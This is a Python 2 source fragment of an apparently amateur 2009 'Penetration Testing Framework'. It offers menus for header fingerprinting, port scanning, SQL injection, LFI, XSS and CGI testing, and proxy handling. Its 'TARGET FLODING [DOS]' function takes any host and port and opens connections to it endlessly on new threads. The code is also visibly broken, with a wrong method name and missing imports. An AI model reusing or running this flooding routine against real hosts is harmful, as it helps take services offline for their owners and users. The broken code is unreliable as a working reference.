			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Syntax")
			        	         		
	
def foot():
	#!/usr/bin/python
	import urllib2, string, sys, os, httplib, socket 
	global anony,hacking
	def saw6(target):
	
		if target != 0:
			h = httplib.HTTP(anony)
			h.putrequest("GET", "http://"+target)
		else:
			h = httplib.HTTP(target[:-1])
			h.putrequest("HEAD")
		h.putheader("Host", target)
		h.endheaders()
		okresp, reason, headers = h.getreply()
		return okresp, reason, headers.get("Server")
	
	def fun(op): 
		global a, b, c, d, e, f, g, h, i, j, k 
		sal = urllib2.Request(op) 
		url_handle = urllib2.urlopen(sal) 
		reqq = url_handle.info() 
 
		ashu = str(reqq).replace('\r','') 
		salman = ashu.split('\n') 
		for gost in range(0, len(salman)): 
			if 'Date:' in salman[gost]: 
				a = salman[gost].split('Date: ')[1] 
			if 'Server:' in salman[gost]: 
				b = salman[gost].split('Server: ')[1] 
			if 'Accept-Ranges:' in salman[gost]: 
				c = salman[gost].split('Accept-Ranges: ')[1] 
			if 'Vary:' in salman[gost]: 
				d = salman[gost].split('Vary: ')[1] 
			if 'Content-Length:' in salman[gost]: 
				e = salman[gost].split('Content-Length: ')[1] 
			if 'Connection:' in salman[gost]: 
				f = salman[gost].split('Connection: ')[1] 
			if 'Content-Type:' in salman[gost]: 
				g = salman[gost].split('Content-Type: ')[1] 
			if 'Expires:' in salman[gost]: 
				h = salman[gost].split('Expires: ')[1] 
			if 'Set-Cookie:' in salman[gost]: 
				i = salman[gost].split('Set-Cookie: ')[1] 
			if 'Transfer-Encoding:' in salman[gost]: 
				fpTC = salman[gost].split('Transfer-Encoding: ')[1] 
			if 'Cache-Control:' in salman[gost]: 
				k = salman[gost].split('Cache-Control: ')[1] 
		baser = { 'Date:-': a, 
			    'Server:-': b, 
			    'Accept-Ranges:-': c, 
			    'Vary:-': d, 
			    'Content-Lenght:-': e, 
			    'Connection:-': f, 
			    'Content-Type:-': g, 
			    'Expires:-': h, 
			    'Set-Cookie:-': i, 
			    'Transfer-Encoding:-': j, 
			    'Cache-Control:-': k } 
		xss_file = open(hacking, "a")
		xss_file.writelines("\n\t\t#################################################\n")
		xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
		xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
		xss_file.writelines("\t\t#    WEB SERVER IDENTIFIER  Report              #\n")
		xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
		xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
		xss_file.writelines("\t\t#    GNU General Public License                 #\n")
		xss_file.writelines("\t\t#################################################\n")
		xss_file.writelines("\t\t            Target Is ")
		xss_file.write(usrop)
		xss_file.writelines("\n\t\t----------------------------------------------------\n\n")
		for secondgost, value in baser.items(): 
			print "\n\t[-]",secondgost, value 
			xss_file.write("\n\t[-]")
			xss_file.write(secondgost)
			xss_file.write(value)
		sending_back_to_cilage=raw_input("\n\tPress Any key To Going Back...")
 
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    WEB SERVER IDENTIFIER                      #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                 
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tRoot@RPT ")	
		if cho == '2': 
			hlpserverid()	
		elif cho == '1': 
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			usrop = raw_input("\nEnter your Target Site Here : ") 
			print "\n[+] Target",usrop,"is loded Sucsesfully"
			print "[+] Fetching Serverinfo From Target"
			print "---------------------------------------" 
			if usrop.startswith('http'): 
				if anony != 0:
					saw6(usrop)	
					fun(usrop) 
				else:
					fun(usrop)
			else: 
				if anony != 0:
					saw6(usrop)
					fun('http://'+usrop)
				else:
					fun('http://'+usrop)
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Syntax")


def babydol():

	#!/usr/bin/python
	import socket, string, random, time, thread, os
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    TARGET  FLODING [DOS]                      #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For For Exit From Current Menu"
		cho = raw_input("\n\t\tRoot@RPT ")	
		if cho == '2':
			hlpdos()
		elif cho == '1':
			def jigar(i):
    				try:
        				salman1 = socket(AF_INET, SOCK_STREAM)
        				salman1.jigar((t, ashu))
        				sleep(99999)
        				salman1.close
    				except:
        				print "\t[+]Flooding The Target"
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			t = raw_input("Enter The Target: ")
			ashu = input("\nEnter The Flooding Port: ")
			print "\n[+] Target",t,"is Loded Sucsesfully"
			print "\n[+] Target Port",ashu,"Is Loded"
			print "\nAre You Sure You Want To Attack ????"
			bade=raw_input("\nPress Any Key For Conteneue.....")
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			love = 0
			while 1:
				try:
					start_new_thread(jigar, (love,))
				except:
					print "\t[-] Host is Not Rechable... Trying Again..."
				print "\t[-] Sending Packets on Target",t,"Using Port",ashu
				print "\t[-] Press CNTR + C For Stop The Attack & Exit From Framework"
				sleep(0.1)
		
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Syntax")
	
def japan(allahname):
	
	global jense, anony, myip, hacking
	if allahname != '110':
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		bo=raw_input("\n\t\tYou Have Just Trying To Use Cracked version ")
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	choice = '1'
	while ( choice != '9' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET     #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  MAIN MENU                                    #" 
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\tEnter 1 For Port Scanning"
			print "\n\t\tEnter 2 For Finding SQL Injection From Website"
			print "\n\t\tEnter 3 For Finding Blind Injection From Website"
			print "\n\t\tEnter 4 For Finding Local File Includation From Website"
			print "\n\t\tEnter 5 For Finding Cross Site Scripting From Website"
			print "\n\t\tEnter 6 For CGI And Logical Vulnarablity Testing"
			print "\n\t\tEnter 7 For Help Of This Task "
			print "\n\t\tEnter 8 For for exit from Current menu"
			choice = raw_input("\n\t\tRoot@RPT ")
			if choice == '1':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET  #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  PORT SCANNAR                              #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tRoot@RPT ")	
					if cho == '2':
						hlpport()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						xss_file = open(hacking, "a")
						xss_file.writelines("\n\t\t#################################################\n")
						xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
						xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
						xss_file.writelines("\t\t#    PORT SCANNAR                               #\n")
						xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
						xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
						xss_file.writelines("\t\t#    GNU General Public License                 #\n")
						xss_file.writelines("\t\t#################################################\n")
						xss_file.writelines("\t\t            Target Is ")
						xss_file.writelines("\n\t\t----------------------------------------------------\n\n")
						xss_file.close()
						oppor()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Syntax")
			elif choice == '2':
				jense= choice
				xss_file = open(hacking, "a")
				xss_file.writelines("\n\t\t#################################################\n")
				xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
				xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
				xss_file.writelines("\t\t#    SQL INJECTION                              #\n")
				xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
				xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
				xss_file.writelines("\t\t#    GNU General Public License                 #\n")
				xss_file.writelines("\t\t#################################################\n")
				xss_file.writelines("\t\t            Target Is ")
				xss_file.writelines("\n\t\t----------------------------------------------------\n\n")
				xss_file.close()
				sqlin()
			elif choice == '3':
				jense= choice
				xss_file = open(hacking, "a")
				xss_file.writelines("\n\t\t#################################################\n")
				xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
				xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
				xss_file.writelines("\t\t#    BLIND INJECTION                            #\n")
				xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
				xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
				xss_file.writelines("\t\t#    GNU General Public License                 #\n")
				xss_file.writelines("\t\t#################################################\n")
				xss_file.writelines("\t\t            Target Is ")
				xss_file.writelines("\n\t\t----------------------------------------------------\n\n")
				xss_file.close()
				sqlin()
			elif choice == '4' :
				jense= choice
				xss_file = open(hacking, "a")
				xss_file.writelines("\n\t\t#################################################\n")
				xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
				xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
				xss_file.writelines("\t\t#    LFI Report                                 #\n")
				xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
				xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
				xss_file.writelines("\t\t#    GNU General Public License                 #\n")
				xss_file.writelines("\t\t#################################################\n")
				xss_file.writelines("\t\t            Target Is ")
				xss_file.writelines("\n\t\t----------------------------------------------------\n\n")
				xss_file.close()
				sqlin()
			
			elif choice == '5':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET  #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  XSS SCANNAR                               #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tRoot@RPT ")	
					if cho == '2':
						hlpxss()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						xssi()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Syntax")
			elif choice == '6':
				xss_file = open(hacking, "a")
				xss_file.writelines("\n\t\t#################################################\n")
				xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
				xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
				xss_file.writelines("\t\t#    CGI + LOGICAL TESTING  Report              #\n")
				xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
				xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
				xss_file.writelines("\t\t#    GNU General Public License                 #\n")
				xss_file.writelines("\t\t#################################################\n")
				xss_file.writelines("\t\t            Target Is ")
				xss_file.writelines("\n\t\t----------------------------------------------------\n\n")
				xss_file.close()
				cgiscan()
			
			elif choice == '7':
				hlpweb()
			elif choice == '8':
				break
			else: 
				bo=raw_input("\n\t\tWoops !!! Invalid Syntax")


def america(bhoombhoom):	
	if bhoombhoom != 786:
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		bo=raw_input("\n\t\tYou Have Just Trying To Use Cracked version ")
		sys.exit(1) 
	global anony, myip
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	choice = '1'
	while ( choice != '7' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali               #"
		print "\t\t#  SERVER TASK                                  #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
		print "\t\t#  www.Ashikali.com                             #" 
		print "\t\t#  GNU General Public License                   #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Web Server Identification "
		print "\n\t\tEnter 2 For Web Server Host Enumeration "
		print "\n\t\tEnter 3 For Web Server Network Range Qualified "
		print "\n\t\tEnter 4 For Bandwidth Testing"
		print "\n\t\tEnter 5 For Server Monotoring" 
		print "\n\t\tEnter 6 For Help Of This Task "
		print "\n\t\tEnter 7 For Exit From Current Menu"
		choice = raw_input("\n\t\tRoot@RPT ")
		
		if choice == '1':
			foot()
		elif choice == '2':
			xss_file = open(hacking, "a")
			xss_file.writelines("\n\t\t#################################################\n")
			xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
			xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
			xss_file.writelines("\t\t#    WEB SERVER HOST NAME Report                #\n")
			xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
			xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
			xss_file.writelines("\t\t#    GNU General Public License                 #\n")
			xss_file.writelines("\t\t#################################################\n")
			xss_file.writelines("\t\t            Target Is ")
			xss_file.writelines("\n\t\t----------------------------------------------------\n\n")
			xss_file.close()
			subserch()
		elif choice == '3':
			xss_file = open(hacking, "a")
			xss_file.writelines("\n\t\t#################################################\n")
			xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
			xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
			xss_file.writelines("\t\t#    WEB SERVER NETWORK  Report                 #\n")
			xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
			xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
			xss_file.writelines("\t\t#    GNU General Public License                 #\n")
			xss_file.writelines("\t\t#################################################\n")
			xss_file.writelines("\t\t            Target Is ")
			xss_file.writelines("\n\t\t----------------------------------------------------\n\n")
			xss_file.close()
			websevye()
		elif choice == '4':
			babydol()
		elif choice == '5':
			webeye()
		elif choice == '6':
			hlpservertask()
		elif choice == '7':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Syntax")


def london(potatomiki): 
	global anony, myip, anony
	if potatomiki != 'stupid':
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		bo=raw_input("\n\t\tYou Have Just Trying To Use Cracked version ")
		sys.exit(1) 
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	choice='1'
	while (choice != '5'):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t#################################################"
		print "\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
		print "\t#  Copyright (C) 2009 By Ashikali               #"
		print "\t#  RPT V 1.0 [BETA]                             #" 
		print "\t#  Main Menu                                    #"
		print "\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
		print "\t#  www.Ashikali.com                             #" 
		print "\t#  GNU General Public License                   #"
		print "\t#################################################"
		print "\n\tEnter 1 For Server Task"
		print "\n\tEnter 2 For Webapplication Testing"
		print "\n\tEnter 3 For Help Or Detail"
		if anony != 0:
			print "\n\tEnter 4 For Changing, Removing Proxy Or For Exit From Current Menu"
		else:
			print "\n\tEnter 4 For Loading Proxy Or For Exit From Current Menu"
		print "\n\tEnter 5 For Exit Completly"
		if anony == 0:
			print "\n\tYou Are using This Tool By Ip",myip	
		else:
			print "\n\tNOTE:- Currently You Are Using Proxy",anony
		choice = raw_input("\n\tRoot@RPT ")
 		if choice == '1':
			bhoombhoom = 786
			america(bhoombhoom)
		elif choice == '2':
			allahname = '110'
			japan(allahname)
		elif choice == '3':
			hlpmain()
		elif choice == '4':
			break
		elif choice == '5':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  RPT V 1.0 [BETA]                             #" 
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\t   Thanks For Using My Tool Hope You Like This"
			print "\t\t-------------------------------------------------"
			sys.exit(1) 
		else:
			
			bo=raw_input("\n\tWoops !!! Invalid Choice Press Any Key For Enter Again")	

def usaaa(wikimiki):

	global anony
	if wikimiki != '900':
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		bo=raw_input("\n\t\tYou Have Just Trying To Use Cracked version ")
		sys.exit(1) 
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	bol='0'
	while (bol != '9'):
		
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    RPT V 1.0 [BETA]                           #"
		print "\t\t#    PROXY SECTION                              #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tDo You want To Use Proxy ??"
		if anony != 0:
			print "\n\t\tEnter 1 For Enter In Main Menu With This Proxy"
		else:
			print "\n\t\tEnter 1 For Enter In Main Menu Without Proxy"
		print "\n\t\tEnter 2 For Geting Proxy"
		print "\n\t\tEnter 3 For Testing Proxy"
		print "\n\t\tEnter 4 For Loading Proxy"
		if anony != 0:
			print "\n\t\tEnter 5 For Removing Proxy"
			print "\n\t\tEnter 6 For Changing Proxy"
			print "\n\t\tEnter 7 For Help Of This Task"
			print "\n\t\tEnter 8 For Exit Fom Current Menu"
			print "\n\t\tEnter 9 For Exit Completely"
		else:
			print "\n\t\tEnter 5 For Help Of This Task"
			print "\n\t\tEnter 6 For Exit Fom Current Menu"
			print "\n\t\tEnter 7 For Exit Completely"
	
		bol=raw_input("\n\t\tRoot@RPT ")
		
		if bol == '1':
			potatomiki = 'stupid'
			london(potatomiki)
		elif bol == '2':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			cho ='0'
			while ( cho != '3' ):
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t##############################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET  #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali            #"
				print "\t\t#  PROXY SPIDER                              #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
				print "\t\t#  www.Ashikali.com                          #" 
				print "\t\t#  GNU General Public License                #"
				print "\t\t##############################################"
				print "\n\t\tEnter 1 For For Contineue "
				print "\n\t\tEnter 2 For Help Or Detail"
				print "\n\t\tEnter 3 For Exit From Current Menu"
				cho = raw_input("\n\t\tRoot@RPT ")	
				if cho == '2':
					hlpps()	
				elif cho == '1':
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					xss_file = open(hacking, "a")
					xss_file.writelines("\n\t\t#################################################\n")
					xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
					xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
					xss_file.writelines("\t\t#    PROXY  Report                              #\n")
					xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
					xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
					xss_file.writelines("\t\t#    GNU General Public License                 #\n")
					xss_file.writelines("\t\t#################################################\n")
					xss_file.writelines("\t\t            Task Has Been Performed Check proxylist.txt ")
					xss_file.writelines("\n\t\t----------------------------------------------------\n\n") 
					xss_file.close()
					proxch1()
				elif cho == '3':
					break
				else: 
					bo=raw_input("\n\t\tWoops !!! Invalid Syntax")
		elif bol == '3':
			proxtes()
		elif bol == '4':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			anonymise()
		
		elif bol == '5': 
			if anony != 0:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				why_you_are_remove_this = raw_input("\n\n\n\n\n\n\t[+] Proxy Sucsessfuly removed press any key To Conteneue...")
				anony = 0
			else: 
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				hlpptoxy()
		elif bol == '6':
			if anony != 0:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				anony = 0
				anonymise()
				if anony == 0:
					sending_in_dustbin=raw_input("\n\t[+] Because of Failid Proxy It Is Removed presss any key To Conteneue...")
				else:
					sending_to_new_contry=raw_input("\n\t[+] New Proxy Sucsessfuly Applyed Press Any Key To Apply New Seting...")
			else:
				break 
		
		elif bol == '7':
			if anony == 0:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t#################################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET     #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali               #"
				print "\t\t#  RPT V 1.0 [BETA]                             #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
				print "\t\t#  www.Ashikali.com                             #" 
				print "\t\t#  GNU General Public License                   #"
				print "\t\t#################################################"
				print "\n\t\t   Thanks For Using My Tool Hope You Like This"
				print "\t\t-------------------------------------------------"
				sys.exit(1) 
			else:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				hlpptoxy()
		elif bol == '8':
			if anony == 0:
				bo=raw_input("\n\t\tWoops !!! Invalid Syntax")
			else:
				break
		elif  bol == '9':
			if anony == 0:
				bo=raw_input("\n\t\tWoops !!! Invalid Syntax")
			else:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t#################################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET     #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali               #"
				print "\t\t#  RPT V 1.0 [BETA]                             #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
				print "\t\t#  www.Ashikali.com                             #" 
				print "\t\t#  GNU General Public License                   #"
				print "\t\t#################################################"
				print "\n\t\t   Thanks For Using My Tool Hope You Like This"
				print "\t\t-------------------------------------------------"
				sys.exit(1) 
		else:
			bo=raw_input("\n\t\tWoops !!! Invalid Syntax")





counter = 0
global hacking
neter=1
if neter >= 0:
	choo= '0'
	while choo !='3':
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		sec=raw_input("\n\n\n\n\n\n\n\n\n\n\n\t\t\tEnter Your Licence Key Here : ")
		if sec == '1' and neter>=0:
			if os.name == "posix":	
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			hacking=raw_input("\n\n\n\n\n\n\n\n\n\n\n\t\t\tEnter Report File Name Here : ")
			bikimiki = '900'
			usaaa(bikimiki)
				
			
		else: 
			bo=raw_input("\n\t\tYour licence key is Invalid")
			counter= counter+1
			if counter==3:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				bo=raw_input("\n\t\tMaximum Failair Occure Application Will Exit ")
				sys.exit(1) 
else:
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	bo=raw_input("\n\t\tYour Copy Is Expired Sorry You Should Purchase Its Again")
	
	
	